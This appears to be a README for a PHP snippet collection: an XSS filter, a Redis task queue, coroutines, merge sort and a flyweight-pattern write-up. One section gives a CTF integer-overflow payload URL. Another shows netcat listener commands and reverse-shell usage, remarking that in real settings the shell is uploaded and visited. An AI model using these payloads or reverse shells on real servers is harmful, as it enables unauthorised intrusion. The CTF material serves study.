# PHP
### xsshtml.class.php   
#### filter xss php class 
Usage: 
```
<?php
require('xsshtml.class.php');
$html = '<html code>';
$xss = new XssHtml($html);
$html = $xss->getHtml();
?>
```

PHP Version > 5.0
IE7+ or other browser

### timeQueue.class.php   
#### 基于redis的定时任务
```
$obj = new timeQueue();
//添加任务并制定多少秒之后执行
$obj->add_task('test',[1,2],3);
$obj->add_task('demo',[1,2],2);
$obj->add_task('bug',[1,2],12);
$obj->add_task('test',[3,4],1);
$obj->add_task('test',[5,6],8);
//回调函数
$func = function ($args){
    var_dump($args);
};
//设置需要监听的任务
$obj->listen_task('test',$func);
$obj->listen_task('demo',$func);
//移除一个已经注册了的任务
$obj->remove_task('bug');
$obj->run();

---------------
在相应时间之后，相关事件开始运行

```

### PHP协程 coroutine.php
```
php coroutine.php
多任务调度器
task A 0
task BBB 0
task A 1
task BBB 1
task A 2
task BBB 2
task A 3
task BBB 3
task A 4
task BBB 4
task BBB 5
task BBB 6
task BBB 7
task BBB 8
task BBB 9
task BBB 10
task BBB 11
task BBB 12
task BBB 13
task BBB 14
两个任务是交替运行的, 而在第二个任务结束后, 只有第一个任务继续运行.
```


### 一道PHP CTF 题目 
```
<?php
include('config.php');
if(empty($_GET['user'])) die('exit');
$user = ['admin', 'password'];
if($_GET['user'] === $user && $_GET['user'][0] != 'admin'){
    echo $flag;
}
?>
<h3><?php echo $flag;?>

上面一段php程序，要求攻击者能够获得$flag即为成功
分析：
按照正常逻辑是无法获得flag的，but，php是一个神奇的语言。
官方曾发布过一个补丁：
https://bugs.php.net/bug.php?id=69892
问题就出在这儿：

测试： 
php -r "var_dump([0 => 0] === [0x100000000 => 0]);" 
bool(true)
返回了true，整形溢出
构造payload:
http://localhost/test.php?user[1]=password&user[4294967296]=admin
2^32 == 0x100000000 == 4294967296 所以是：user[4294967296]
所有条件均符合，flag获得，如下图：
```
![](https://github.com/LockGit/PHP/blob/master/ctf.jpeg)


### php-reverse-shell.php 一个反弹shell的php程序
```
终端1：
Mac环境：
➜  ~ nc -l -v -n 0 1234

Linux：
nc -v -n -l -p 1234


终端2：
---
注释：
$shell = 'uname -a; w; id; /bin/sh -i';
man sh
-i        If the -i option is present, the shell is interactive.
忘记了这个参数的作用了，sh -i 是激活交互的方式
---

执行：
	php php-reverse-shell.php
现实环境中上传shell后，访问让其运行即可
程序会fork一个子进程，并尝试连接某个ip的某个端口
测试时用的是本地的127.0.0.1 1234端口
➜  ~ php php-reverse-shell.php
Successfully opened reverse shell to 127.0.0.1:1234
➜  ~

此时终端1立即获得一个shell的交互界面，尝试去任意命运执行吧
```

### yield_sort.php 使用php模仿python的yield归并排序2个有序序列
```
将已有序的子序列合并,得到完全有序的序列.
例：
$a=[1,3,5,7,9,18,19,20];
$b=[2,4,6,8,22];
➜  PHP git:(master) ✗ php yield_sort.php
1--->2--->3--->4--->5--->6--->7--->8--->9--->18--->19--->20--->22
场景1：
前端负载均衡，nginx日志分散在多个机器上时,有序合并所有日志
```

### sharePool.php 享元模式
```
add 在经常听到的设计模式(值-对象模式，代理模式，工厂模式，适配器模式，桥接模式）之外的一个设计模式（享元模式）
模式分析：
　　享元模式是一个考虑系统性能的设计模式，通过使用享元模式可以节约内存空间，提高系统的性能。
　　享元模式的核心在于享元工厂类，享元工厂类的作用在于提供一个用于存储享元对象的享元池，用户需要对象时，首先从享元池中获取，如果享元池中不存在，则创建一个新的享元对象返回给用户，并在享元池中保存该新增对象。
　　享元模式以共享的方式高效地支持大量的细粒度对象，享元对象能做到共享的关键是区分内部状态(Internal State)和外部状态(External State)。
　　内部状态是存储在享元对象内部并且不会随环境改变而改变的状态，因此内部状态可以共享。
　　外部状态是随环境改变而改变的、不可以共享的状态。享元对象的外部状态必须由客户端保存，并在享元对象被创建之后，在需要使用的时候再传入到享元对象内部。一个外部状态与另一个外部状态之间是相互独立的。

优点
　　享元模式的优点在于它可以极大减少内存中对象的数量，使得相同对象或相似对象在内存中只保存一份。
　　享元模式的外部状态相对独立，而且不会影响其内部状态，从而使得享元对象可以在不同的环境中被共享。

缺点
　　享元模式使得系统更加复杂，需要分离出内部状态和外部状态，这使得程序的逻辑复杂化。
　　为了使对象可以共享，享元模式需要将享元对象的状态外部化，而读取外部状态使得运行时间变长。

在以下情况下可以使用享元模式：
　　一个系统有大量相同或者相似的对象，由于这类对象的大量使用，造成内存的大量耗费。
　　对象的大部分状态都可以外部化，可以将这些外部状态传入对象中。
　　使用享元模式需要维护一个存储享元对象的享元池，而这需要耗费资源，因此，应当在多次重复使用享元对象时才值得使用享元模式。

单纯享元模式和复合享元模式
　　单纯享元模式：在单纯享元模式中，所有的享元对象都是可以共享的，即所有抽象享元类的子类都可共享，不存在非共享具体享元类
　　复合享元模式：将一些单纯享元使用组合模式加以组合，可以形成复合享元对象，这样的复合享元对象本身不能共享，但是它们可以分解成单纯享元对象，而后者则可以共享。

享元模式与其他模式的联用
　　在享元模式的享元工厂类中通常提供一个静态的工厂方法用于返回享元对象，使用简单工厂模式来生成享元对象。
　　在一个系统中，通常只有唯一一个享元工厂，因此享元工厂类可以使用单例模式进行设计。
　　享元模式可以结合组合模式形成复合享元模式，统一对享元对象设置外部状态。
```
